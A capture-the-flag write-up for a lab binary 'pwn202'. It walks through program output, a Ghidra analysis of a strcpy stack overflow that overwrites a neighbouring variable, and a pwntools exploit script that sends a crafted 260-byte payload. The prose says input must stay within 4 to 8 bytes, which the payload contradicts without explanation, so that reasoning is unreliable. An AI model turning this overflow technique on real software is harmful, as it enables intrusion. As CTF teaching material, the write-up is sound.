## Write-up

When running:
```
λ ~/Desktop/CTF@NCSC/pwn/pwn2/ ./pwn202
Hey please enter the Secret password for lab 202 mr pwner:
AAAA
Length of your input is: 4
are you sure ? Not the password mr Pwner !
```

But if input is too long:
```
λ ~/Desktop/CTF@NCSC/pwn/pwn2/ ./pwn202
Hey please enter the Secret password for lab 202 mr pwner:
AAAAAAAAAAAAAAAAAAA
Length of your input is: 19
hey ! you must Keep the length between 4 and 8, I can see you are doing a overflow !!
```
So there’s **length checking logic** before something interesting happens.



Using Ghidra, we reverse the `check()` function and discovered the following:

### Vulnerability 
- The program uses `strcpy()` to copy user input into `local_17`, a 10-byte buffer. 
- However, it doesn't validate the actual size, only the **length of input**, and only **after** calling `strlen()` and **before** calling `strcpy()`. 
- So **even if the length is valid (4 ≤ len ≤ 8)**, a malicious input can overwrite `local_c` which is **right after** `local_17`.


- Overwrite `local_c` with `0x49693121` by carefully crafting our input to overflow the buffer and land that integer in memory. 
- We must: 
1. Keep our input length **between 4 and 8** to pass the check.
2. Still overflow `local_17` enough to **overwrite `local_c`** with our target value. 
3. Use binary tools (like GDB or pwndbg) to find the **exact offset** between `local_17` and `local_c`”


## Exploit
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn202_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("")

    return r


def main():
    r = conn()

    payload = b'A' * 11
    payload += p32(0x49693121)
    payload += b'B' * 245
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```
